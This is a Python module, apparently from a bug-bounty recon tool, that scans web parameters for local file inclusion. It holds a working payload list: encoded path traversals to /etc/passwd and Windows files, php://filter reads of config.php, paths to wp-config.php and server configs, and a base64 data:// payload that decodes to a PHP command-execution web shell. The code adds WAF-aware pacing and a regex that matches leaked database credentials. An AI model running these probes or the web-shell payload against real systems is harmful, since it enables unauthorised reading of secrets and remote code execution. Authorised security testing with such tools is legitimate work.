import re
import base64
from core.ui import vuln, CYN, RED, GRY, RESET, warn
from core.http import http_probe
from core.rate_limit import RATE_LIMITER
from . import BaseScanner
import logging
logger = logging.getLogger("bb-recon")

LFI_PAYLOADS = [
    # Basic Linux
    ("../../../../etc/passwd",            "linux-classic"),
    ("....//....//....//etc/passwd",      "dot-slash-bypass"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "double-encode"),
    ("..%252f..%252f..%252fetc/passwd",   "url-encode-bypass"),
    ("..%c0%af..%c0%af..%c0%afetc/passwd", "unicode-bypass"),
    
    # PHP/Data wrappers
    ("php://filter/read=convert.base64-encode/resource=../config.php", "php-filter-b64-config"),
    ("php://filter/read=string.rot13/resource=/etc/passwd", "php-filter-rot13"),
    ("php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd", "php-filter-iconv"),
    ("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGxEb25lJzsgPz4=", "php-data-wrapper"),
    
    # Windows
    ("..\\..\\..\\..\\windows\\win.ini",  "win-classic"),
    ("..%5c..%5c..%5cwindows%5cwin.ini",   "win-enc"),
    ("C:\\Windows\\System32\\drivers\\etc\\hosts", "win-hosts"),

    # Apache / Nginx / Configs
    ("/var/www/html/wp-config.php", "wp-config-abs"),
    ("/etc/nginx/nginx.conf", "nginx-conf"),
    ("/etc/apache2/apache2.conf", "apache-conf"),
]
LFI_HITS = re.compile(
    r"root:[x*]:0:0"
    r"|bin/bash|bin/sh"
    r"|\[(boot loader|extensions|mci extensions|fonts|files)\]" # Windows ini sections
    r"|base64,[A-Za-z0-9+/]{50,}"
    r"|<\\?php" # PHP source code leak
    r"|DB_PASSWORD|DB_USER" # Config leaks
    r"|127\.0\.0\.1\s+localhost", # Hosts file
    re.I
)

class LFIScanner(BaseScanner):
    async def scan(self, url: str) -> list:
        findings = []
        await self._waf_sleep()
        parsed, params = self._get_params(url)
        if not params: return findings

        _, base_body, _, _ = await http_probe(self.session, url, timeout=8)
        
        for param in list(params.keys())[:4]:
            confirmed = False
            for payload, tag in LFI_PAYLOADS:
                if confirmed: break
                
                test_params = dict(params)
                test_params[param] = [payload]
                test_url = self._build_url(parsed, test_params)
                
                code2, body2, _, _ = await http_probe(self.session, test_url, timeout=8)
                await self._waf_sleep()
                
                if self.waf_detected and code2 in (403, 406, 429, 503):
                    warn(f"WAF blocked LFI probe on {param} — skipping")
                    break
                    
                if LFI_HITS.search(body2):
                    m2 = LFI_HITS.search(body2)
                    if m2 and not LFI_HITS.search(base_body):
                        vuln(f"LFI CONFIRMED: {url}")
                        print(GRY+"│    "+RESET+CYN+f"param: {param}  payload: {payload}"+RESET)
                        print(GRY+"│    "+RESET+RED+f"evidence: {m2.group(0)[:80]}"+RESET)
                        findings.append({"type":"LFI","url":url,"param":param,
                                         "payload":payload,"evidence":m2.group(0)[:120]})
                        confirmed = True
                        
                if "php-filter" in tag and code2 == 200 and not confirmed:
                    clean = re.sub(r"<[^>]+>","", body2).strip()
                    if re.match(r"^[A-Za-z0-9+/]{40,}={0,2}$", clean[:200]):
                        vuln(f"LFI php://filter: {url}")
                        print(GRY+"│    "+RESET+CYN+f"param: {param}"+RESET)
                        try:
                            dec = base64.b64decode(clean[:500]).decode("utf-8",errors="ignore")
                            print(GRY+"│    "+RESET+RED+f"decoded: {dec[:100]}"+RESET)
                            findings.append({"type":"LFI-phpfilter","url":url,"param":param,
                                             "decoded_snippet":dec[:200]})
                        except Exception as e:
                            logger.debug(f"Base64 decode failed for LFI filter: {e}")
                            findings.append({"type":"LFI-phpfilter","url":url,"param":param})
                        confirmed = True

        return findings
